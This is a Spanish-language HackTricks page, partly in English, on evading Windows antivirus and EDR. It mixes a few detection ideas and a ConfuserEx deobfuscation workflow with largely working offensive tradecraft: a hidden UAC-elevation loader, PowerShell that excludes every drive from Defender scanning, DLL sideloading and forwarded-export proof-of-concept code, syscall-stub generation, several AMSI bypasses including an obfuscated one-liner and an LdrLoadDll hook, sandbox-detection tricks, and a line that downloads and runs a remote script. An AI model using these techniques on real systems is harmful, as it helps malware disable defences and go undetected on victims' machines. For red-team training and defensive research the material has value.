# Evasión de Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Esta página fue escrita inicialmente por** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Detener Defender

- [defendnot](https://github.com/es3n1n/defendnot): Una herramienta para impedir que Windows Defender funcione.
- [no-defender](https://github.com/es3n1n/no-defender): Una herramienta para impedir que Windows Defender funcione, simulando ser otro AV.
- [Deshabilitar Defender si eres admin](basic-powershell-for-pentesters/README.md)

### Señuelo de UAC estilo instalador antes de manipular Defender

Los loaders públicos que se hacen pasar por cheats de juegos suelen distribuirse como instaladores de Node.js/Nexe sin firma que primero **solicitan al usuario una elevación** y solo después neutralizan Defender. El flujo es sencillo:

1. Comprueba si existe un contexto administrativo con `net session`. El comando solo tiene éxito cuando el proceso posee derechos de admin, por lo que un error indica que el loader se está ejecutando como usuario estándar.
2. Se vuelve a ejecutar inmediatamente con el verbo `RunAs` para activar el aviso de consentimiento de UAC esperado mientras conserva la línea de comandos original.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Las víctimas ya creen que están instalando software “cracked”, por lo que normalmente aceptan el prompt, otorgando al malware los permisos que necesita para cambiar la política de Defender.<sup>[[26]](#references)</sup>

### Exclusiones generales de `MpPreference` para cada letra de unidad

Una vez elevados los privilegios, las cadenas del estilo GachiLoader maximizan los puntos ciegos de Defender en lugar de deshabilitar el servicio directamente. Primero, el loader termina el watchdog de la GUI (`taskkill /F /IM SecHealthUI.exe`) y después aplica **exclusiones extremadamente amplias**, de modo que cada perfil de usuario, directorio del sistema y disco extraíble quede fuera del alcance del análisis:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Observaciones clave:

- El bucle recorre todos los sistemas de archivos montados (D:\, E:\, memorias USB, etc.), por lo que **se ignora cualquier payload futuro depositado en cualquier ubicación del disco**.
- La exclusión de la extensión `.sys` está orientada al futuro: los atacantes conservan la opción de cargar drivers no firmados más adelante sin volver a tocar Defender.
- Todos los cambios se realizan en `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, lo que permite a las etapas posteriores confirmar que las exclusiones persisten o ampliarlas sin volver a activar UAC.

Como no se detiene ningún servicio de Defender, las comprobaciones de estado ingenuas siguen informando “antivirus activo”, aunque la inspección en tiempo real nunca examine esas rutas.<sup>[[26]](#references)</sup>

## **Metodología de evasión de AV**

Actualmente, los AV utilizan diferentes métodos para comprobar si un archivo es malicioso o no: detección estática, análisis dinámico y, en los EDR más avanzados, análisis de comportamiento.

### **Detección estática**

La detección estática se consigue señalando strings maliciosos conocidos o arrays de bytes en un binario o script, además de extraer información del propio archivo (por ejemplo, descripción del archivo, nombre de la empresa, firmas digitales, icono, checksum, etc.). Esto significa que usar herramientas públicas conocidas puede hacer que te detecten más fácilmente, ya que probablemente hayan sido analizadas y marcadas como maliciosas. Hay un par de formas de evitar este tipo de detección:

- **Encryption**

Si encryptas el binario, no habrá forma de que el AV detecte tu programa, pero necesitarás algún tipo de loader para desencryptarlo y ejecutar el programa en memoria.

- **Obfuscation**

A veces, todo lo que necesitas hacer es cambiar algunos strings de tu binario o script para que pase el AV, pero puede ser una tarea que consuma mucho tiempo dependiendo de lo que estés intentando ofuscar.

- **Custom tooling**

Si desarrollas tus propias herramientas, no habrá signatures maliciosas conocidas, pero esto requiere mucho tiempo y esfuerzo.

> [!TIP]
> Una buena forma de comprobar la detección estática de Windows Defender es [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Básicamente, divide el archivo en múltiples segmentos y después le pide a Defender que analice cada uno individualmente; de esta forma, puede decirte exactamente qué strings o bytes están marcados en tu binario.

Te recomiendo encarecidamente que revises esta [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sobre evasión práctica de AV.

### **Análisis dinámico**

El análisis dinámico ocurre cuando el AV ejecuta tu binario en un sandbox y observa si hay actividad maliciosa (por ejemplo, intentar desencryptar y leer las contraseñas de tu navegador, realizar un minidump de LSASS, etc.). Esta parte puede ser algo más difícil de abordar, pero aquí tienes algunas cosas que puedes hacer para evadir los sandboxes.

- **Sleep before execution** Dependiendo de cómo esté implementado, puede ser una buena forma de evadir el análisis dinámico del AV. Los AV tienen muy poco tiempo para analizar los archivos y no interrumpir el flujo de trabajo del usuario, por lo que usar sleeps largos puede dificultar el análisis de los binarios. El problema es que muchos sandboxes de AV pueden simplemente omitir el sleep dependiendo de cómo esté implementado.
- **Checking machine's resources** Normalmente, los Sandboxes tienen muy pocos recursos disponibles (por ejemplo, < 2GB de RAM); de lo contrario, podrían ralentizar el equipo del usuario. Aquí también puedes ser muy creativo, por ejemplo, comprobando la temperatura de la CPU o incluso la velocidad de los ventiladores; no todo estará implementado en el sandbox.
- **Machine-specific checks** Si quieres dirigirte a un usuario cuya workstation está unida al dominio "contoso.local", puedes comprobar el dominio del equipo para ver si coincide con el que has especificado; si no coincide, puedes hacer que tu programa salga.

Resulta que el computername del Sandbox de Microsoft Defender es HAL9TH, así que puedes comprobar el nombre del equipo en tu malware antes de la detonación; si el nombre coincide con HAL9TH, significa que estás dentro del sandbox de Defender, por lo que puedes hacer que tu programa salga.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Algunos otros consejos realmente buenos de [@mgeeky](https://twitter.com/mariuszbit) para enfrentarse a los Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Como hemos dicho antes en este post, las **public tools** acabarán siendo **detectadas**, así que deberías hacerte una pregunta:

Por ejemplo, si quieres volcar LSASS, **¿realmente necesitas usar mimikatz**? ¿O podrías usar otro proyecto menos conocido que también vuelque LSASS?

La respuesta correcta probablemente sea la segunda. Tomando mimikatz como ejemplo, probablemente sea una de las piezas de malware más marcadas por los AV y EDR, si no la que más; aunque el proyecto en sí es genial, también es una pesadilla trabajar con él para evadir los AV. Por tanto, busca alternativas para lograr lo que intentas conseguir.

> [!TIP]
> Al modificar tus payloads para evadir la detección, asegúrate de **desactivar el envío automático de muestras** en Defender y, por favor, en serio, **NO SUBAS A VIRUSTOTAL** nada si tu objetivo es conseguir evasión a largo plazo. Si quieres comprobar si un AV concreto detecta tu payload, instálalo en una VM, intenta desactivar el envío automático de muestras y pruébalo allí hasta estar satisfecho con el resultado.

## EXEs vs DLLs

Siempre que sea posible, **prioriza el uso de DLLs para la evasión**; según mi experiencia, los archivos DLL suelen estar **mucho menos detectados** y analizados, por lo que es un truco muy sencillo para evitar la detección en algunos casos (si tu payload tiene alguna forma de ejecutarse como una DLL, claro).

Como podemos ver en esta imagen, un DLL Payload de Havoc tiene una tasa de detección de 4/26 en antiscan.me, mientras que el payload EXE tiene una tasa de detección de 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>comparación en antiscan.me de un payload EXE normal de Havoc frente a una DLL normal de Havoc</p></figcaption></figure>

Ahora mostraremos algunos trucos que puedes usar con archivos DLL para ser mucho más sigiloso.

## DLL Sideloading & Proxying

El **DLL Sideloading** aprovecha el orden de búsqueda de DLL utilizado por el loader, colocando la aplicación víctima y el payload o payloads maliciosos uno junto al otro.

Puedes buscar programas susceptibles a DLL Sideloading utilizando [Siofra](https://github.com/Cybereason/siofra) y el siguiente script de powershell:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Este comando mostrará la lista de programas susceptibles a DLL hijacking dentro de "C:\Program Files\\" y los archivos DLL que intentan cargar.

Recomiendo encarecidamente que **explores por tu cuenta los programas DLL Hijackable/Sideloadable**; esta técnica es bastante sigilosa si se realiza correctamente, pero si utilizas programas DLL Sideloadable conocidos públicamente, podrían detectarte fácilmente.

El simple hecho de colocar una DLL maliciosa con el nombre que un programa espera cargar no hará que se cargue tu payload, ya que el programa espera encontrar funciones específicas dentro de esa DLL. Para solucionar este problema, utilizaremos otra técnica llamada **DLL Proxying/Forwarding**.

**DLL Proxying** redirige las llamadas que un programa realiza desde la DLL proxy (y maliciosa) hacia la DLL original, preservando así la funcionalidad del programa y permitiendo gestionar la ejecución de tu payload.

Utilizaré el proyecto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/)

Estos son los pasos que seguí:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
El último comando nos dará 2 archivos: una plantilla de código fuente de una DLL y la DLL original renombrada.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Estos son los resultados:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Tanto nuestro shellcode (codificado con [SGN](https://github.com/EgeBalci/sgn)) como la proxy DLL tienen una tasa de detección de 0/26 en [antiscan.me](https://antiscan.me). ¡Yo diría que ha sido un éxito!

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Te **recomiendo encarecidamente** que veas el [VOD de Twitch de S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) sobre DLL Sideloading y también el [vídeo de ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) para aprender más sobre lo que hemos analizado con mayor profundidad.

### Abusing Forwarded Exports (ForwardSideLoading)

Los módulos PE pueden exportar funciones que en realidad son "forwarders": en lugar de apuntar a código, la entrada de exportación contiene una cadena ASCII con el formato `TargetDll.TargetFunc`. Cuando un caller resuelve la exportación, el loader de Windows:

- Carga `TargetDll` si aún no está cargada
- Resuelve `TargetFunc` desde ella

Comportamientos clave que debes comprender:
- Si `TargetDll` es una KnownDLL, se proporciona desde el namespace protegido KnownDLLs (por ejemplo, ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Si `TargetDll` no es una KnownDLL, se utiliza el orden normal de búsqueda de DLL, que incluye el directorio del módulo que está realizando la resolución del forward.

Esto permite una primitive de sideloading indirecto: busca una DLL firmada que exporte una función reenviada a un nombre de módulo que no sea una KnownDLL y, a continuación, coloca esa DLL firmada junto a una DLL controlada por el atacante cuyo nombre coincida exactamente con el del módulo reenviado. Cuando se invoca la exportación reenviada, el loader resuelve el forward y carga tu DLL desde el mismo directorio, ejecutando tu DllMain.<sup>[[13]](#references)</sup>

Ejemplo observado en Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` no es una KnownDLL, por lo que se resuelve mediante el orden de búsqueda normal.

PoC (copiar y pegar):
1) Copia la DLL del sistema firmada a una carpeta con permisos de escritura
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Coloca una `NCRYPTPROV.dll` maliciosa en la misma carpeta. Un DllMain mínimo es suficiente para lograr la ejecución de código; no necesitas implementar la función reenviada para activar DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Activa el reenvío con un LOLBin firmado:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Comportamiento observado:
- rundll32 (firmado) carga el `keyiso.dll` side-by-side (firmado)
- Mientras resuelve `KeyIsoSetAuditingInterface`, el loader sigue el forward hacia `NCRYPTPROV.SetAuditingInterface`
- El loader carga `NCRYPTPROV.dll` desde `C:\test` y ejecuta su `DllMain`
- Si `SetAuditingInterface` no está implementado, obtendrás un error de "missing API" solo después de que `DllMain` ya se haya ejecutado

Consejos de hunting:
- Céntrate en los exports forwardeados cuyo módulo de destino no sea un KnownDLL. Los KnownDLLs aparecen en `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Puedes enumerar los exports forwardeados con herramientas como:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Consulta el inventario de forwarders de Windows 11 para buscar candidatos: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ideas de detección/defensa:
- Supervisa LOLBins (p. ej., rundll32.exe) que carguen DLLs firmadas desde rutas que no sean del sistema, seguidas de la carga de KnownDLLs no conocidas con el mismo nombre base desde ese directorio
- Genera una alerta para cadenas de procesos/módulos como: `rundll32.exe` → `keyiso.dll` que no sea del sistema → `NCRYPTPROV.dll` en rutas modificables por el usuario
- Aplica políticas de integridad del código (WDAC/AppLocker) y deniega la escritura y ejecución en directorios de aplicaciones

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze es un toolkit de payloads para evadir EDRs mediante procesos suspendidos, syscalls directas y métodos de ejecución alternativos`

Puedes usar Freeze para cargar y ejecutar tu shellcode de forma sigilosa.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> La evasión es simplemente un juego del gato y el ratón; lo que funciona hoy podría detectarse mañana, así que nunca dependas de una sola herramienta. Si es posible, intenta encadenar múltiples técnicas de evasión.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

Los EDR suelen colocar **user-mode inline hooks** en los stubs de syscall de `ntdll.dll`. Para evadir esos hooks, puedes generar stubs de syscall **directos** o **indirectos** que carguen el **SSN** (System Service Number) correcto y realicen la transición al kernel sin ejecutar el entrypoint exportado que contiene el hook.<sup>[[32]](#references)</sup>

**Opciones de invocación:**
- **Direct (embedded)**: emite una instrucción `syscall`/`sysenter`/`SVC #0` en el stub generado (sin acceder al export de `ntdll`).
- **Indirect**: salta a un gadget `syscall` existente dentro de `ntdll`, de modo que la transición al kernel parece originarse en `ntdll` (útil para evadir heurísticas); **randomized indirect** selecciona un gadget de un pool en cada llamada.
- **Egg-hunt**: evita incrustar en disco la secuencia de opcode estática `0F 05`; resuelve una secuencia de syscall en runtime.

**Estrategias de resolución de SSN resistentes a hooks:**
- **FreshyCalls (VA sort)**: infiere los SSN ordenando los stubs de syscall por dirección virtual en lugar de leer los bytes del stub.
- **SyscallsFromDisk**: mapea un `\KnownDlls\ntdll.dll` limpio, lee los SSN desde su `.text` y luego lo desmapea (evade todos los hooks en memoria).
- **RecycledGate**: combina la inferencia de SSN mediante ordenación por VA con la validación de opcodes cuando un stub está limpio; recurre a la inferencia por VA si está hookeado.
- **HW Breakpoint**: establece DR0 en la instrucción `syscall` y utiliza un VEH para capturar el SSN desde `EAX` en runtime, sin analizar bytes hookeados.

Ejemplo de uso de SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI se creó para prevenir el "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Inicialmente, los AV solo podían analizar **archivos en disco**, por lo que, si de alguna forma podías ejecutar payloads **directamente en memoria**, el AV no podía hacer nada para impedirlo, ya que no tenía suficiente visibilidad.

La funcionalidad AMSI está integrada en estos componentes de Windows.

- User Account Control, o UAC (elevación de la instalación de EXE, COM, MSI o ActiveX)
- PowerShell (scripts, uso interactivo y evaluación de código dinámico)
- Windows Script Host (wscript.exe y cscript.exe)
- JavaScript y VBScript
- Macros de Office VBA

Permite que las soluciones antivirus inspeccionen el comportamiento de los scripts exponiendo su contenido de una forma no cifrada y no ofuscada.

Ejecutar `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` producirá la siguiente alerta en Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Observa cómo antepone `amsi:` y, después, la ruta al ejecutable desde el que se ejecutó el script, en este caso, powershell.exe

No dejamos ningún archivo en el disco, pero aun así fuimos detectados en memoria debido a AMSI.

Además, a partir de **.NET 4.8**, el código C# también pasa por AMSI. Esto incluso afecta a `Assembly.Load(byte[])` para cargar la ejecución en memoria. Por eso se recomienda usar versiones inferiores de .NET (como la 4.7.2 o anteriores) para la ejecución en memoria si quieres evadir AMSI.

Hay un par de formas de sortear AMSI:

- **Obfuscation**

Dado que AMSI funciona principalmente con detecciones estáticas, modificar los scripts que intentas cargar puede ser una buena forma de evadir la detección.

Sin embargo, AMSI tiene la capacidad de desofuscar scripts incluso si tienen varias capas, por lo que la ofuscación podría ser una mala opción dependiendo de cómo se realice. Esto hace que evadirlo no sea tan sencillo. Aunque, a veces, todo lo que necesitas hacer es cambiar un par de nombres de variables y será suficiente, por lo que depende de cuánto se haya marcado algo.

- **AMSI Bypass**

Dado que AMSI se implementa cargando una DLL en el proceso de powershell (también cscript.exe, wscript.exe, etc.), es posible manipularla fácilmente incluso ejecutándose como un usuario sin privilegios. Debido a este fallo en la implementación de AMSI, los investigadores han encontrado múltiples formas de evadir el análisis de AMSI.

**Forcing an Error**

Forzar que la inicialización de AMSI falle (`amsiInitFailed`) hará que no se inicie ningún análisis para el proceso actual. Originalmente, esto fue divulgado por [Matt Graeber](https://twitter.com/mattifestation), y Microsoft ha desarrollado una signature para impedir un uso más amplio.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Solo hizo falta una línea de código de powershell para dejar AMSI inutilizable para el proceso actual de powershell. Por supuesto, esta línea ha sido detectada por el propio AMSI, por lo que es necesario modificarla para poder utilizar esta técnica.

Aquí tienes un bypass de AMSI modificado que tomé de este [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Please read [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) for a more detailed explanation.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI se inicializa únicamente después de que `amsi.dll` se carga en el proceso actual. Un bypass robusto e independiente del lenguaje consiste en colocar un hook en modo usuario sobre `ntdll!LdrLoadDll` que devuelva un error cuando el módulo solicitado sea `amsi.dll`. Como resultado, AMSI nunca se carga y no se realizan scans para ese proceso.<sup>[[23]](#references)</sup>

Esquema de implementación (pseudocódigo de C/C++ para x64):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notas
- Funciona con PowerShell, WScript/CScript y custom loaders por igual (cualquier elemento que, de otro modo, cargara AMSI).
- Combínalo con el envío de scripts mediante stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) para evitar artefactos largos en la línea de comandos.
- Se ha observado su uso por loaders ejecutados mediante LOLBins (por ejemplo, `regsvr32` llamando a `DllRegisterServer`).

La herramienta **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** también genera scripts para bypass de AMSI.
La herramienta **[https://amsibypass.com/](https://amsibypass.com/)** también genera scripts para bypass de AMSI que evitan las signatures mediante funciones y variables definidas por el usuario, expresiones de caracteres aleatorizadas y la aplicación aleatoria de mayúsculas y minúsculas a las palabras clave de PowerShell para evitar la signature.

**Elimina la signature detectada**

Puedes usar una herramienta como **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** y **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** para eliminar la signature de AMSI detectada de la memoria del proceso actual. Esta herramienta funciona escaneando la memoria del proceso actual en busca de la signature de AMSI y sobrescribiéndola con instrucciones NOP, eliminándola efectivamente de la memoria.

**Productos AV/EDR que utilizan AMSI**

Puedes encontrar una lista de productos AV/EDR que utilizan AMSI en **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Usa PowerShell version 2**
Si utilizas PowerShell version 2, AMSI no se cargará, por lo que podrás ejecutar tus scripts sin que AMSI los analice. Puedes hacerlo así:
```bash
powershell.exe -version 2
```
## Registro de PS

El logging de PowerShell es una función que permite registrar todos los comandos de PowerShell ejecutados en un sistema. Esto puede ser útil para fines de auditoría y troubleshooting, pero también puede ser un **problema para los atacantes que quieren evadir la detección**.

Para evadir el logging de PowerShell, puedes usar las siguientes técnicas:

- **Deshabilitar PowerShell Transcription y Module Logging**: Puedes usar una herramienta como [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) para este propósito.
- **Usar PowerShell versión 2**: Si usas PowerShell versión 2, AMSI no se cargará, por lo que podrás ejecutar tus scripts sin que AMSI los escanee. Puedes hacerlo así: `powershell.exe -version 2`
- **Usar una sesión de PowerShell no administrada**: Usa [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) para alojar PowerShell sin iniciar `powershell.exe` (el enfoque utilizado por `powerpick` de Cobalt Strike). Esto evade los controles vinculados específicamente al proceso `powershell.exe`, pero no deshabilita inherentemente AMSI, Script Block Logging ni todas las demás defensas de PowerShell; la cobertura depende del runtime y de la implementación del host.


## Ofuscación

> [!TIP]
> Varias técnicas de ofuscación dependen de cifrar datos, lo que aumentará la entropía del binario y facilitará su detección por parte de los AV y EDR. Ten cuidado con esto y quizá aplica el cifrado solo a secciones específicas de tu código que sean sensibles o deban ocultarse.

### Deobfuscating Binaries .NET Protected with ConfuserEx

Al analizar malware que usa ConfuserEx 2 (o forks comerciales), es común encontrarse con varias capas de protección que bloquearán los decompiladores y los sandboxes. El flujo de trabajo siguiente **restaura un IL casi original** que posteriormente puede decompilarse a C# en herramientas como dnSpy o ILSpy.<sup>[[10]](#references)</sup>

1. Eliminación del anti-tampering – ConfuserEx cifra cada *method body* y lo descifra dentro del constructor estático (`<Module>.cctor`) del *module*. También modifica el checksum del PE, por lo que cualquier modificación provocará que el binario se cierre. Usa **AntiTamperKiller** para localizar las tablas de metadatos cifradas, recuperar las claves XOR y reescribir un assembly limpio:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
La salida contiene los 6 parámetros del anti-tampering (`key0-key3`, `nameHash`, `internKey`), que pueden ser útiles al crear tu propio unpacker.

2. Recuperación de símbolos / control-flow – proporciona el archivo *clean* a **de4dot-cex** (un fork de de4dot compatible con ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – selecciona el perfil de ConfuserEx 2
• de4dot deshará el aplanamiento del control-flow, restaurará los namespaces, las clases y los nombres de las variables originales, y descifrará las cadenas constantes.

3. Eliminación de proxy calls – ConfuserEx reemplaza las llamadas directas a métodos por wrappers ligeros (también llamados *proxy calls*) para dificultar aún más la decompilación. Elimínalos con **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Después de este paso deberías observar APIs normales de .NET, como `Convert.FromBase64String` o `AES.Create()`, en lugar de funciones wrapper opacas (`Class8.smethod_10`, …).

4. Limpieza manual – ejecuta el binario resultante en dnSpy, busca grandes bloques Base64 o usos de `RijndaelManaged`/`TripleDESCryptoServiceProvider` para localizar el payload *real*. A menudo el malware lo almacena como un array de bytes codificado en TLV e inicializado dentro de `<Module>.byte_0`.

La cadena anterior restaura el flujo de ejecución **sin necesidad de ejecutar la muestra maliciosa**, lo que resulta útil al trabajar en una workstation offline.

> 🛈  ConfuserEx genera un atributo personalizado llamado `ConfusedByAttribute` que puede usarse como IOC para realizar un triage automático de las muestras.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: ofuscador de C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): El objetivo de este proyecto es proporcionar un fork de código abierto de la suite de compilación [LLVM](http://www.llvm.org/) capaz de ofrecer una mayor seguridad del software mediante la [ofuscación de código](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) y la protección contra manipulaciones.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demuestra cómo utilizar el lenguaje `C++11/14` para generar, en tiempo de compilación, código ofuscado sin utilizar ninguna herramienta externa y sin modificar el compilador.
- [**obfy**](https://github.com/fritzone/obfy): Añade una capa de operaciones ofuscadas generadas por el framework de metaprogramación de templates de C++, lo que hará un poco más difícil la vida de la persona que quiera crackear la aplicación.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz es un ofuscador de binarios x64 capaz de ofuscar varios archivos PE diferentes, incluidos: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame es un motor sencillo de código metamórfico para ejecutables arbitrarios.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator es un framework de ofuscación de código de grano fino para lenguajes compatibles con LLVM que utiliza ROP (return-oriented programming). ROPfuscator ofusca un programa en el nivel del código ensamblador transformando instrucciones normales en cadenas ROP, frustrando nuestra concepción natural del flujo de control normal.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt es un PE Crypter de .NET escrito en Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor puede convertir EXE/DLL existentes en shellcode y luego cargarlos

## SmartScreen & MoTW

Es posible que hayas visto esta pantalla al descargar algunos ejecutables de Internet y ejecutarlos.

Microsoft Defender SmartScreen es un mecanismo de seguridad diseñado para proteger al usuario final frente a la ejecución de aplicaciones potencialmente maliciosas.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

